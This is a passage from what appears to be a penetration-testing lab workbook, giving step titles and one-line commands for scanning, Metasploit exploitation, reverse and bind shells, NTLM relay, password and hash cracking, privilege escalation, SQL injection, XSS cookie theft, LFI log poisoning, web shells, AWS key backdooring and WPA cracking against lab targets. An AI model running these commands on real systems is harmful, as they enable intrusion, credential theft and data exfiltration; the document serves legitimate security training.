Discovery and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15–16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Vulnerability Scanning with Greenbone / OpenVAS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Web Vulnerability Scanning with Nikto and ZAP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17–18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Container Image Scanning with Trivy and Grype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Secrets Scanning with TruffleHog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19–19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Validating Findings and Public Exploit Selection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Scanning with Greenbone / OpenVAS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deploys Greenbone CE via Docker, scans a vulnerable target, and triages the findings by severity, QoD, and manual validation.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triaged Greenbone/OpenVAS scan report with true and false positives separated.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Greenbone/OpenVAS, Docker, gvm-cli, Nmap, curl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Vulnerability Scanning with Greenb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Scanning with Greenbone / OpenVAS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Deploy Greenbone CE with Docker Compose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mkdir greenbone &amp;&amp; cd greenbone; curl -O https://greenbone.github.io/docs/latest/_static/docker-compose-22.4.yml; sudo docker compose -f docker-compose-22.4.yml -p greenbone up -d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Vulnerability Scanning with Greenb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Scanning with Greenbone / OpenVAS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Watch the vulnerability feed sync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docker compose -p greenbone logs -f gvmd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Vulnerability Scanning with Greenb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Scanning with Greenbone / OpenVAS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target for the vulnerable VM in the GSA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Vulnerability Scanning with Greenb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Scanning with Greenbone / OpenVAS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Attach SSH/SMB creds for an authenticated scan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Vulnerability Scanning with Greenb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Scanning with Greenbone / OpenVAS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and start a Full and fast scan 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Vulnerability Scanning with Greenb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Scanning with Greenbone / OpenVAS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Triage findings by severity and QoD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Vulnerability Scanning with Greenb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Scanning with Greenbone / OpenVAS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Validate the MS17-010 SMB finding with Nmap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nmap --script smb-vuln-ms17-010 &lt;TARGET&gt;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Vulnerability Scanning with Greenb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Scanning with Greenbone / OpenVAS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Validate the Apache path traversal with curl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http://target/cgi-bin/.%2e/.%2e/etc/passwd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Vulnerability Scanning with Greenb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Scanning with Greenbone / OpenVAS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List scan tasks from the CLI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gvm-cli socket --xml="&lt;get_tasks/&gt;"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Scanning with Greenbone / OpenVAS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Confirm high-severity findings are validated as true positives and the report exports to PDF/XML/CSV.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Web Vulnerability Scanning with Nikto and ZAP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scans DVWA with Nikto and OWASP ZAP, running ZAP both headless and as an authenticated GUI active scan.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Nikto and ZAP DAST reports cross-referenced to the OWASP Top 10.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Nikto, OWASP ZAP, zap-cli, Wapiti, DVWA, Docker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Web Vulnerability Scanning with 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Web Vulnerability Scanning with Nikto and ZAP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Start the DVWA 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docker run --rm -d --name dvwa -p 80:80 vulnerables/web-dvwa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177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Web Vulnerability Scanning with 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Web Vulnerability Scanning with Nikto and ZAP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Scan the app with Nikto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nikto -h http://127.0.0.1 -o nikto.html -Format htm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178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Web Vulnerability Scanning with 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Web Vulnerability Scanning with Nikto and ZAP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Launch the ZAP headless daemon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zaproxy -daemon -port 8090 -config api.disablekey=true &amp;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179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Web Vulnerability Scanning with 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Web Vulnerability Scanning with Nikto and ZAP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a ZAP quick baseline scan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zap-cli -p 8090 quick-scan --self-contained --start-options "-config api.disablekey=true" http://127.0.0.1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180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Web Vulnerability Scanning with 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Web Vulnerability Scanning with Nikto and ZAP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the official ZAP Docker baseline scan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docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t http://host.docker.internal -r baseline.html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181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Web Vulnerability Scanning with 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Web Vulnerability Scanning with Nikto and ZAP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Proxy the DVWA login and run a GUI active scan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182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Web Vulnerability Scanning with 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Web Vulnerability Scanning with Nikto and ZAP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Get a third opinion with Wapiti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wapiti -u http://127.0.0.1 -f html -o wapiti-report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183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Web Vulnerability Scanning with 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Web Vulnerability Scanning with Nikto and ZAP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and export the ZAP HTML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184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Web Vulnerability Scanning with Nikto and ZAP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Confirm the ZAP Alerts tab shows SQL injection, XSS, and CSRF and reports are saved to the engagement folder.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185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Image Scanning with Trivy and Grype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scans a container image with Trivy and Grype, scans Dockerfile/IaC and SBOMs, and runs kube-hunter against a cluster.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Trivy and Grype CVE reports plus IaC misconfiguration and kube-hunter findings.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Trivy, Grype, kube-hunter, minikube, jq, Docker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186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Container Image Scanning with Triv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Image Scanning with Trivy and Grype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Trivy and Grype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apt install -y trivy; curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sudo sh -s -- -b /usr/local/bin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187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Container Image Scanning with Triv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Image Scanning with Trivy and Grype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Scan a public image with both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trivy image --severity HIGH,CRITICAL nginx:1.18.0; grype nginx:1.18.0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188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Container Image Scanning with Triv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Image Scanning with Trivy and Grype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Save scan output as JSON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trivy image --format json --output nginx-trivy.json nginx:1.18.0; grype nginx:1.18.0 -o json &gt; nginx-grype.json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189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Container Image Scanning with Triv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Image Scanning with Trivy and Grype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Scan a Dockerfile and IaC config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trivy config Dockerfile.bad; trivy config ./k8s/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190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Container Image Scanning with Triv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Image Scanning with Trivy and Grype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software composition analysis on the filesystem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trivy fs --scanners vuln,secret,license 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191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Container Image Scanning with Triv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Image Scanning with Trivy and Grype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Start minikube and run kube-hunter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minikube start --driver=docker; pip install kube-hunter; kube-hunter --remote $(minikube ip)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192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Container Image Scanning with Triv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Image Scanning with Trivy and Grype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Extract critical CVEs with jq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jq '.Results[].Vulnerabilities[]? | select(.Severity=="CRITICAL") | .VulnerabilityID' nginx-trivy.json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193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Image Scanning with Trivy and Grype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Confirm both scanners report CVEs, Trivy flags the bad Dockerfile, and kube-hunter probes the Kubernetes API.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194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Secrets Scanning with TruffleHog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hunts secrets across Git history, filesystems, and Docker images with TruffleHog and Gitleaks, verifying live credentials.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Verified secret findings mapped to CWE-798 with rotation and remediation guidance.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TruffleHog, Gitleaks, jq, Docker, git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195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Secrets Scanning with TruffleHog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Secrets Scanning with TruffleHog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TruffleHog and Gitleaks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apt install -y trufflehog gitleaks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196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Secrets Scanning with TruffleHog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Secrets Scanning with TruffleHog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Scan a public Git repo for verified secrets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trufflehog git https://github.com/dxa4481/truffleHog.git --only-verified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197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Secrets Scanning with TruffleHog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Secrets Scanning with TruffleHog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Deep-scan every commit and branch of a repo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git clone https://github.com/owasp/wstg.git; trufflehog git file://./wstg --no-update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198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Secrets Scanning with TruffleHog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Secrets Scanning with TruffleHog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Get a second opinion with Gitleaks in SARIF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gitleaks detect --source ./wstg --report-format sarif --report-path gitleaks.sarif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199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Secrets Scanning with TruffleHog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Secrets Scanning with TruffleHog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Scan a Docker image for baked-in secrets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trufflehog docker --image nginx:1.18.0 --only-verified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200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Secrets Scanning with TruffleHog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Secrets Scanning with TruffleHog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Scan a filesystem for secrets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trufflehog filesystem /home --only-verified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201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Secrets Scanning with TruffleHog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Secrets Scanning with TruffleHog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a custom org-specific detector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trufflehog filesystem . --config custom.yaml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202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Secrets Scanning with TruffleHog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Confirm --only-verified confirms live secrets and each finding is tied to CWE-798 with a rotation recommendation.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203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Validating Findings and Public Exploit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confirms true positives, eliminates false positives, and selects a safe public exploit using searchsploit and EPSS/KEV.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validation log of true and false positives plus a vetted, reviewed exploit choice.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searchsploit, Exploit-DB, Nmap, Metasploit, CISA KEV, EPSS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204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Validating Findings and Public Exp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Validating Findings and Public Exploit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exploitdb and update searchsploit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apt install -y exploitdb; searchsploit --update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205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Validating Findings and Public Exp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Validating Findings and Public Exploit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Query Exploit-DB offline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searchsploit vsftpd 2.3.4; searchsploit --cve 2017-0144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206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Validating Findings and Public Exp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Validating Findings and Public Exploit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Inspect an exploit before running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searchsploit -p 50704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207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Validating Findings and Public Exp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Validating Findings and Public Exploit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Mirror the exploit locally and hash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searchsploit -m 50704; sha256sum 50704.py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208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Validating Findings and Public Exp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Validating Findings and Public Exploit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an Nmap finding with a safe probe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nmap -p445 --script smb-vuln-ms17-010 &lt;TARGET&gt;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209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Validating Findings and Public Exp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Validating Findings and Public Exploit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 with a non-destructive Metasploit aux module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msfconsole -q; use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS &lt;TARGET&gt;; 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210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Validating Findings and Public Exp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Validating Findings and Public Exploit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Prioritise an exploit by KEV, EPSS, and maturity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211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Validating Findings and Public Exp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Validating Findings and Public Exploit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a validation log for the report appendix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212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Validating Findings and Public Exploit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Confirm each finding is labelled TP or FP with a documented, non-destructive validation method.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213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Vulnerability Discovery and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3.1 Conduct vulnerability discovery (network scans, authenticated/unauthenticated, host-based); 3.2 Analyse scan output.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3.1 Application scans (DAST); 4.5 Web app attack tools (ZAP).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3.1 Container scans (including sidecar), SCA, IaC scanning; Kube-hunter.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2.2 Secrets enumeration (cloud keys, passwords, API keys, session tokens); 3.1 Secrets scanning.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3.2 Analyze output from recon/scanning phases (FP/FN, true positives, scan completeness); 4.1 Capability selection — tool/exploit selection.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214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Attacks and Exploits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Metasploit · Responder/SMB Relay · Hydra · Hashcat · Priv-Esc · SQLi/XSS · Cloud · Wireless · Social Eng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215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35%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Attacks and Exploits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Metasploit Framework standardises exploitation: choose an exploit and a payload, set options, and gain a session; poisoning and relay (Responder, ntlmrelayx) capture and reuse credentials on the network.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Password attacks split into online (Hydra, Medusa against live services) and offline (hashcat, John cracking captured hashes); privilege escalation on Linux (LinPEAS) and Windows (Kerberoasting) turns a foothold into full control.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Web attacks exploit injection and logic flaws — SQL injection (sqlmap), XSS/CSRF/SSRF (Burp Suite), and file inclusion / directory traversal leading to web shells.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modern attack surface extends to cloud (S3/IAM with Pacu, ScoutSuite), wireless (WPA cracking with Aircrack-ng) and people (phishing with GoPhish and the Social-Engineer Toolkit).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216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Attacks and Exploits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20–24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Exploitation with the Metasploit Framework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Bind and Reverse Shells with Netcat and Socat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LLMNR/NBT-NS Poisoning and SMB Relay with Responder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Online Password Attacks with Hydra and Medusa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Offline Hash Cracking with hashcat and John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25–29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Linux Privilege Escalation with LinPEAS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Windows Privilege Escalation and Kerberoasting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SQL Injection with sqlmap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XSS, CSRF and SSRF with Burp Suite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File Inclusion, Directory Traversal and Web Shells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30–32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Cloud Attacks: S3 and IAM with Pacu and ScoutSuite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Wireless Attacks: WPA Cracking with Aircrack-ng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Social Engineering with GoPhish and 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217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Exploitation with the Metasploit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runs the msfconsole search-use-set-run workflow to exploit a vsftpd backdoor and land a root shell.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root shell on Metasploitable2 via the vsftpd 2.3.4 backdoor, plus a reusable resource script.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Metasploit, msfconsole, msfvenom, meterpreter, msfdb, Docker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218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Exploitation with the Metasploit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Exploitation with the Metasploit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Spin up the Metasploitable2 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docker run --rm -d --name msf2 -p 21:21 -p 4444:4444 tleemcjr/metasploitable2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219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Exploitation with the Metasploit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Exploitation with the Metasploit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Initialise the database and launch msfconsole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msfdb init; msfconsole -q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220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Exploitation with the Metasploit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Exploitation with the Metasploit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Search for and select the vsftpd exploit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search vsftpd 2.3.4; use exploit/unix/ftp/vsftpd_234_backdoor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221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Exploitation with the Metasploit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Exploitation with the Metasploit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the module details, references and rank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info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222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Exploitation with the Metasploit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Exploitation with the Metasploit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Set the target host, port and payload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set RHOSTS 127.0.0.1; set RPORT 21; set PAYLOAD cmd/unix/interact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223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Exploitation with the Metasploit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Exploitation with the Metasploit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the exploit and confirm a root shell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224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Exploitation with the Metasploit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Exploitation with the Metasploit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a matching meterpreter payload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msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;your IP&gt; LPORT=4444 -f elf -o shell.elf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225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Exploitation with the Metasploit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Exploitation with the Metasploit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Automate the chained exploit with a resource script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msfconsole -q -r pwn.rc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226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Exploitation with the Metasploit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Running id in the obtained shell returns uid=0(root).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227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Bind and Reverse Shells with Netcat and Socat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catches a reverse shell and sets up a bind shell with Netcat, transfers files over the channel, builds an encrypted shell with ncat --ssl and socat, then stabilises a dumb shell into a fully interactive TTY with job control.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working reverse shell, a bind shell, an encrypted socat/ncat channel and a stabilised interactive TTY.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Netcat (nc/ncat), socat, Python, Kali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228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Bind and Reverse Shells with Netca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Bind and Reverse Shells with Netcat and Socat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netcat and install ncat and socat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which nc; sudo apt update &amp;&amp; sudo apt install -y ncat socat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229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Bind and Reverse Shells with Netca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Bind and Reverse Shells with Netcat and Socat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Start a Netcat listener on the attacker host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nc -lvnp 4444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230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Bind and Reverse Shells with Netca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Bind and Reverse Shells with Netcat and Socat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Catch a reverse shell dialled back from the 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# on target:  bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1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231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Bind and Reverse Shells with Netca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Bind and Reverse Shells with Netcat and Socat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Set up a bind shell on the target and connect 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# target:  nc -lvnp 5555 -e /bin/bash    |    attacker:  nc TARGET_IP 5555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232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Bind and Reverse Shells with Netca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Bind and Reverse Shells with Netcat and Socat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Transfer a file over the Netcat channel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# receiver:  nc -lvnp 6666 &gt; loot.tar    |    sender:  nc ATTACKER_IP 6666 &lt; loot.tar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233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Bind and Reverse Shells with Netca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Bind and Reverse Shells with Netcat and Socat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an encrypted reverse shell with ncat --ssl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ncat --ssl -lvnp 4443    # target:  ncat --ssl ATTACKER_IP 4443 -e /bin/bash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234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Bind and Reverse Shells with Netca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Bind and Reverse Shells with Netcat and Socat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an encrypted socat shell with a full PTY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socat OPENSSL-LISTEN:4442,cert=server.pem,verify=0,fork -    # target:  socat OPENSSL:ATTACKER_IP:4442,verify=0 EXEC:'/bin/bash',pty,stderr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235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Bind and Reverse Shells with Netca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Bind and Reverse Shells with Netcat and Socat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Upgrade a dumb shell to a fully interactive TTY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python3 -c 'import pty; pty.spawn("/bin/bash")'   # then Ctrl-Z; stty raw -echo; fg; export TERM=xterm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236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Bind and Reverse Shells with Netcat and Socat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Confirm both the reverse and bind shells return remote command execution, the ncat/socat channel is encrypted, and the TTY upgrade yields a full interactive shell with working job control.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237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LLMNR/NBT-NS Poisoning and SMB Relay with Responder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poisons LLMNR/NBT-NS broadcasts with Responder to capture NetNTLMv2 hashes, then relays them with ntlmrelayx.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Captured NetNTLMv2 hashes and a relayed SMB authentication yielding remote code execution.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Responder, impacket-ntlmrelayx, hashcat, crackmapexec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238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LLMNR/NBT-NS Poisoning and SMB Rel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LLMNR/NBT-NS Poisoning and SMB Relay with Responder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Responder to poison LLMNR/NBT-NS and answer WPAD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responder -I eth0 -wf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239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LLMNR/NBT-NS Poisoning and SMB Rel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LLMNR/NBT-NS Poisoning and SMB Relay with Responder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Crack the captured NetNTLMv2 hash offline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hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt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240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LLMNR/NBT-NS Poisoning and SMB Rel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LLMNR/NBT-NS Poisoning and SMB Relay with Responder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Disable Responder's SMB/HTTP listeners for relaying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nano /usr/share/responder/Responder.conf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241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LLMNR/NBT-NS Poisoning and SMB Rel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LLMNR/NBT-NS Poisoning and SMB Relay with Responder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Enumerate SMB hosts that lack signing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crackmapexec smb 10.0.0.0/24 --gen-relay-list relay-targets.txt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242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LLMNR/NBT-NS Poisoning and SMB Rel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LLMNR/NBT-NS Poisoning and SMB Relay with Responder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Restart Responder in analyze/poison-only mode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responder -I eth0 -A &amp;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243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LLMNR/NBT-NS Poisoning and SMB Rel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LLMNR/NBT-NS Poisoning and SMB Relay with Responder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Relay the live authentication to a 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impacket-ntlmrelayx -tf relay-targets.txt -smb2support -c "powershell -enc &lt;base64&gt;"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244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LLMNR/NBT-NS Poisoning and SMB Rel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LLMNR/NBT-NS Poisoning and SMB Relay with Responder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Recommend LLMNR/NBT-NS and SMB-signing mitigations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245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LLMNR/NBT-NS Poisoning and SMB Relay with Responder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ntlmrelayx replays a victim's authentication to a non-signed host and executes the payload as an admin.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246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Online Password Attacks with Hydra and Medusa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performs online brute-force, spraying, and credential-stuffing attacks against live SSH, FTP, and HTTP services.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Recovered service credentials (msfadmin:msfadmin) from live SSH, FTP and web-form logins.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Hydra, Medusa, cewl, crunch, Docker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247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Online Password Attacks with Hydra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Online Password Attacks with Hydra and Medusa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Start the multi-service Metasploitable2 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docker run --rm -d --name msf2 -p 21:21 -p 22:22 -p 80:80 -p 445:445 tleemcjr/metasploitable2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248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Online Password Attacks with Hydra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Online Password Attacks with Hydra and Medusa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Prepare a trimmed password wordlist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head -1000 /usr/share/wordlists/rockyou.txt &gt; rockyou-1k.txt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249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Online Password Attacks with Hydra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Online Password Attacks with Hydra and Medusa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Brute force SSH with Hydra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hydra -L users.txt -P rockyou-1k.txt -t 4 -f ssh://$TARGET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250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Online Password Attacks with Hydra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Online Password Attacks with Hydra and Medusa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Brute force FTP with Medusa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medusa -h $TARGET -U users.txt -P rockyou-1k.txt -M ftp -t 5 -f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251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Online Password Attacks with Hydra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Online Password Attacks with Hydra and Medusa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Spray a single password low-and-slow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hydra -L users.txt -p 'Spring2026!' ssh://$TARGET -t 1 -W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252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Online Password Attacks with Hydra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Online Password Attacks with Hydra and Medusa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Attack a web login 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hydra -l admin -P rockyou-1k.txt $TARGET http-post-form "/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=Login failed"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253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Online Password Attacks with Hydra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Online Password Attacks with Hydra and Medusa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a custom wordlist by spidering the site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cewl -d 2 -m 5 -w cewl.txt http://$TARGET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254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Online Password Attacks with Hydra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Online Password Attacks with Hydra and Medusa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a credential-stuffing attack from a combo list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hydra -C combo.txt ssh://$TARGET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255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Online Password Attacks with Hydra and Medusa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Hydra reports a valid msfadmin:msfadmin login for the SSH service.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256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Offline Hash Cracking with hashcat and John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identifies hash types then cracks them offline using hashcat attack modes and John the Ripper.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Cracked plaintext passwords for MD5, NTLM and archive hashes.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hashcat, John the Ripper, hashid, zip2john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257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Offline Hash Cracking with hashcat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Offline Hash Cracking with hashcat and John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Identify the hash types in the sample bank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hashid -m hashes.txt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258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Offline Hash Cracking with hashcat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Offline Hash Cracking with hashcat and John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a straight dictionary attack with hashcat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hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt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259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Offline Hash Cracking with hashcat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Offline Hash Cracking with hashcat and John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Apply mangling rules to the wordlist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hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule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260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Offline Hash Cracking with hashcat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Offline Hash Cracking with hashcat and John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a targeted mask brute-force attack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hashcat -m 1000 -a 3 ntlm.txt '?u?l?l?l?l?l?d?d'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261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Offline Hash Cracking with hashcat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Offline Hash Cracking with hashcat and John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a hybrid dictionary-plus-mask attack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hashcat -m 0 -a 6 hashes.txt rockyou.txt '?d?d?d?d'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262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Offline Hash Cracking with hashcat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Offline Hash Cracking with hashcat and John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Crack NTLM hashes with John the Ripper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john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt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263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Offline Hash Cracking with hashcat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Offline Hash Cracking with hashcat and John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Extract and crack a ZIP archive hash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zip2john /tmp/file.zip &gt; zip.hash; john --wordlist=rockyou.txt zip.hash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264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Offline Hash Cracking with hashcat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Offline Hash Cracking with hashcat and John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Show the cracked passwords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john --show --format=NT hashes.txt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265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Offline Hash Cracking with hashcat and John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hashcat and John reveal the plaintext for the MD5 and NTLM hashes.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266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Linux Privilege Escalation with LinPEAS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enumerates a low-privileged Linux shell with LinPEAS and escalates to root via a sudo misconfiguration and a SUID binary.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root shell from a GTFOBins sudo entry and a PATH-hijacked SUID binary.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LinPEAS, GTFOBins, pspy, searchsploit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267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Linux Privilege Escalation with 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Linux Privilege Escalation with LinPEAS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Enumerate sudo rights and SUID binaries manually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-l; find / -perm -4000 -type f 2&gt;/dev/null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268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Linux Privilege Escalation with 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Linux Privilege Escalation with LinPEAS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Download and run LinPEAS on the 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/tmp/linpeas.sh -a | tee linpeas.out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269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Linux Privilege Escalation with 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Linux Privilege Escalation with LinPEAS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Escape to root via a sudo GTFOBins entry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find . -exec /bin/sh \; -quit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270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Linux Privilege Escalation with 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Linux Privilege Escalation with LinPEAS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Inspect a suspicious SUID binary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strings /usr/local/bin/backup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271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Linux Privilege Escalation with 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Linux Privilege Escalation with LinPEAS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Hijack PATH to exploit a relative-call SUID binary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-e '#!/bin/sh\n/bin/sh' &gt; /tmp/tar; chmod +x /tmp/tar; export PATH=/tmp:$PATH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272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Linux Privilege Escalation with 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Linux Privilege Escalation with LinPEAS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Search for a matching kernel exploit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searchsploit "Linux Kernel 4.4"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273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Linux Privilege Escalation with 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Linux Privilege Escalation with LinPEAS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Dump credentials after escalation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cat /etc/shadow &gt; shadow.txt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274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Linux Privilege Escalation with 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Linux Privilege Escalation with LinPEAS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Watch for root cron jobs with pspy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./pspy -pf -i 1000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275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Linux Privilege Escalation with LinPEAS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Running id after the exploit returns uid=0(root).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276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Windows Privilege Escalation and Kerberoasting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maps an Active Directory domain with BloodHound, Kerberoasts a service account, and moves laterally via pass-the-hash to a domain dump.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Cracked service-account credentials and a domain-wide NTDS dump obtained via DCSync.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BloodHound, impacket-GetUserSPNs, hashcat, crackmapexec, evil-winrm, impacket-secretsdump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277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Windows Privilege Escalation and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Windows Privilege Escalation and Kerberoasting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Collect AD data with BloodHound.py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bloodhound-python -u bob -p Spring2026 -d corp.local -ns 10.0.0.5 -c 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278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Windows Privilege Escalation and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Windows Privilege Escalation and Kerberoasting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Request Kerberoastable SPN hashes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impacket-GetUserSPNs corp.local/bob:Spring2026 -dc-ip 10.0.0.5 -request -outputfile spns.hash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279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Windows Privilege Escalation and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Windows Privilege Escalation and Kerberoasting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Crack the TGS hashes offline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hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt -r best64.rule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280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Windows Privilege Escalation and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Windows Privilege Escalation and Kerberoasting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AS-REP roast pre-auth-disabled accounts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impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.5 -format hashcat -outputfile asrep.hash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281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Windows Privilege Escalation and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Windows Privilege Escalation and Kerberoasting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Enumerate local privesc with WinPEAS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.\winpeas.exe quiet cmd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282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Windows Privilege Escalation and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Windows Privilege Escalation and Kerberoasting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Validate cracked creds across the domain (PtH)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crackmapexec smb 10.0.0.0/24 -u svc_sql -p 'Summer2025' --shares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283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Windows Privilege Escalation and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Windows Privilege Escalation and Kerberoasting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Get an interactive shell with evil-winrm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evil-winrm -i 10.0.0.20 -u svc_sql -p 'Summer2025'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284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Windows Privilege Escalation and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Windows Privilege Escalation and Kerberoasting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DCSync every domain hash as Domain Admin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impacket-secretsdump corp.local/da:Pass@10.0.0.5 -just-dc -outputfile dc.dump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285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Windows Privilege Escalation and Kerberoasting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hashcat cracks a service-account hash and secretsdump exports every domain NTLM hash.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286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SQL Injection with sqlmap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exploits SQL injection in DVWA manually then automates full database extraction with sqlmap.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complete dump of the DVWA users table including the admin password hash.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sqlmap, DVWA, Burp Suite, Docker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287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SQL Injection with sqlmap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SQL Injection with sqlmap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Launch the DVWA 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docker run --rm -d --name dvwa -p 80:80 vulnerables/web-dvwa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288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SQL Injection with sqlmap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SQL Injection with sqlmap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injection with a manual UNION query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?id=1' UNION SELECT user,password FROM users-- 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289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SQL Injection with sqlmap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SQL Injection with sqlmap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Export the session cookie and target URL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COOKIE="PHPSESSID=abc; security=low"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290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SQL Injection with sqlmap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SQL Injection with sqlmap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sqlmap discovery against the endpoint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sqlmap -u "$URL" --cookie="$COOKIE" --batch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291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SQL Injection with sqlmap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SQL Injection with sqlmap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Enumerate databases, tables and columns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sqlmap -u "$URL" --cookie="$COOKIE" --batch -D dvwa -T users --columns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292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SQL Injection with sqlmap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SQL Injection with sqlmap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Dump the users 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sqlmap -u "$URL" --cookie="$COOKIE" --batch -D dvwa -T users --dump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293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SQL Injection with sqlmap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SQL Injection with sqlmap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Tune risk/level and bypass a simple WAF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sqlmap -u "$URL" --cookie="$COOKIE" --risk=3 --level=5 --batch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294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SQL Injection with sqlmap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SQL Injection with sqlmap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Feed a Burp-saved raw request to sqlmap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sqlmap -r request.txt --batch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295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SQL Injection with sqlmap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sqlmap dumps the DVWA users table and reveals the admin MD5 hash.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296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XSS, CSRF and SSRF with Burp Suite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uses Burp Suite to find stored XSS, forge a CSRF request, and trigger SSRF against OWASP Juice Shop.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Working XSS, CSRF and SSRF proof-of-concepts plus a cracked JWT secret.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Burp Suite, OWASP Juice Shop, XSStrike, jwt_tool, hashcat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297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XSS, CSRF and SSRF with Burp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XSS, CSRF and SSRF with Burp Suite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Launch OWASP Juice Shop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docker run --rm -d --name juice -p 3000:3000 bkimminich/juice-shop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298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XSS, CSRF and SSRF with Burp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XSS, CSRF and SSRF with Burp Suite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Inject a stored XSS payload into the search bar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&lt;iframe src="javascript:alert(`xss`)"&gt;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299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XSS, CSRF and SSRF with Burp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XSS, CSRF and SSRF with Burp Suite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Steal cookies with a reflected XSS payload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&lt;script&gt;fetch('https://attacker/?c='+document.cookie)&lt;/script&gt;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300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XSS, CSRF and SSRF with Burp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XSS, CSRF and SSRF with Burp Suite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Fuzz DOM XSS contexts with XSStrike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xsstrike -u 'http://127.0.0.1:3000/#/search?q=test'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301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XSS, CSRF and SSRF with Burp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XSS, CSRF and SSRF with Burp Suite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Forge a state-changing CSRF proof-of-concept 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302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XSS, CSRF and SSRF with Burp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XSS, CSRF and SSRF with Burp Suite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Trigger SSRF to the cloud metadata endpoint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http://localhost:3000/redirect?to=http://169.254.169.254/latest/meta-data/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303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XSS, CSRF and SSRF with Burp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XSS, CSRF and SSRF with Burp Suite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Tamper the JWT with jwt_tool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jwt_tool eyJhbGciOiJIUzI1... -X k -k public.pem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304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XSS, CSRF and SSRF with Burp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XSS, CSRF and SSRF with Burp Suite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Crack the JWT signature offline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hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt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305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XSS, CSRF and SSRF with Burp Suite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XSS alert fires, the SSRF returns metadata, and hashcat recovers the JWT signing secret.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306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Inclusion, Directory Traversal and Web Shells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exploits LFI and RFI in DVWA, escalates LFI to RCE via log poisoning, and drops a stealthy web shell.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RCE web shell obtained through LFI log poisoning and RFI.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DVWA, curl, weevely, Python http.server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307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File Inclusion, Directory Traversa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Inclusion, Directory Traversal and Web Shells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Launch the DVWA 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docker run --rm -d --name dvwa -p 80:80 vulnerables/web-dvwa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308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File Inclusion, Directory Traversa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Inclusion, Directory Traversal and Web Shells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Read arbitrary files via directory traversal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http://127.0.0.1/vulnerabilities/fi/?page=../../../../etc/passwd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309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File Inclusion, Directory Traversa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Inclusion, Directory Traversal and Web Shells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Read PHP source with the php filter wrapper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http://127.0.0.1/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index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310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File Inclusion, Directory Traversa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Inclusion, Directory Traversal and Web Shells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Poison the Apache access log with a PHP payload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-A '&lt;?php system($_GET["c"]); ?&gt;' http://127.0.0.1/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311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File Inclusion, Directory Traversa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Inclusion, Directory Traversal and Web Shells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Include the poisoned log to gain RCE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http://127.0.0.1/vulnerabilities/fi/?page=/var/log/apache2/access.log&amp;c=id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312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File Inclusion, Directory Traversa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Inclusion, Directory Traversal and Web Shells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Host a remote shell for RFI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python3 -m http.server 8080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313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File Inclusion, Directory Traversa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Inclusion, Directory Traversal and Web Shells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Trigger the remote file inclusion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http://target/page?file=http://&lt;KALI&gt;:8080/shell.php&amp;c=id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314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File Inclusion, Directory Traversa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Inclusion, Directory Traversal and Web Shells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Drop a stealthy weevely web shell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weevely generate Spring2026 /tmp/sh.php; weevely http://target/sh.php Spring2026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315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Inclusion, Directory Traversal and Web Shells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Including the poisoned log executes id and returns the command output in the HTTP response.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316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Attacks: S3 and IAM with Pacu and ScoutSuite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audits a misconfigured AWS environment with ScoutSuite and Prowler, then exploits an IAM privilege-escalation chain with Pacu.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Backdoor AWS admin access obtained from an IAM privilege-escalation chain.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Pacu, ScoutSuite, Prowler, CloudGoat, s3scanner, AWS CLI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317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Cloud Attacks: S3 and IAM with Pac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Attacks: S3 and IAM with Pacu and ScoutSuite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cloud pentest tooling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pip install --upgrade pacu scoutsuite prowler-cloud cloudgoat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318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Cloud Attacks: S3 and IAM with Pac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Attacks: S3 and IAM with Pacu and ScoutSuite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Deploy a vulnerable CloudGoat scenario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./cloudgoat.py create iam_privesc_by_attachment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319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Cloud Attacks: S3 and IAM with Pac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Attacks: S3 and IAM with Pacu and ScoutSuite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Recon misconfigurations with ScoutSuite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scout aws --profile cg-starter -r us-east-1 --report-dir scout-report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320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Cloud Attacks: S3 and IAM with Pac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Attacks: S3 and IAM with Pacu and ScoutSuite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a CIS compliance scan with Prowler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prowler aws --compliance cis_2.0_aws -p cg-starter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321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Cloud Attacks: S3 and IAM with Pac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Attacks: S3 and IAM with Pacu and ScoutSuite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Enumerate the user's IAM permissions in Pacu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run iam__enum_permissions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322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Cloud Attacks: S3 and IAM with Pac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Attacks: S3 and IAM with Pacu and ScoutSuite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Find IAM privilege-escalation paths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run iam__privesc_scan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323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Cloud Attacks: S3 and IAM with Pac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Attacks: S3 and IAM with Pacu and ScoutSuite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Backdoor the user's access keys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run iam__backdoor_users_keys --usernames cg-starter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324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Cloud Attacks: S3 and IAM with Pac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Attacks: S3 and IAM with Pacu and ScoutSuite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Hunt for exposed S3 buckets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s3scanner scan -b acme-prod-logs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325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Cloud Attacks: S3 and IAM with Pac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Attacks: S3 and IAM with Pacu and ScoutSuite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Destroy the CloudGoat scenario to stop costs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./cloudgoat.py destroy iam_privesc_by_attachment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326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Attacks: S3 and IAM with Pacu and ScoutSuite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Pacu reports an IAM privesc path and creates backdoor admin keys for cg-starter.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327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Wireless Attacks: WPA Cracking with Aircrack-ng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captures a WPA2 four-way handshake using a deauth burst then cracks the passphrase offline.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cracked WPA2 passphrase recovered from a captured handshake or PMKID.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Aircrack-ng, airodump-ng, aireplay-ng, hcxdumptool, hashcat, reaver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328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Wireless Attacks: WPA Cracking wit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Wireless Attacks: WPA Cracking with Aircrack-ng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Put the Wi-Fi adapter into monitor mode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airmon-ng check kill; sudo airmon-ng start wlan0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329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Wireless Attacks: WPA Cracking wit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Wireless Attacks: WPA Cracking with Aircrack-ng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Scan the air for nearby access points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airodump-ng wlan0mon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330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Wireless Attacks: WPA Cracking wit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Wireless Attacks: WPA Cracking with Aircrack-ng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Capture on the target BSSID and channel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airodump-ng --bssid &lt;BSSID&gt; -c &lt;CH&gt; -w cap wlan0mon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331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Wireless Attacks: WPA Cracking wit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Wireless Attacks: WPA Cracking with Aircrack-ng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Deauth a client to force a re-handshake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aireplay-ng -0 5 -a &lt;BSSID&gt; -c &lt;CLIENT-MAC&gt; 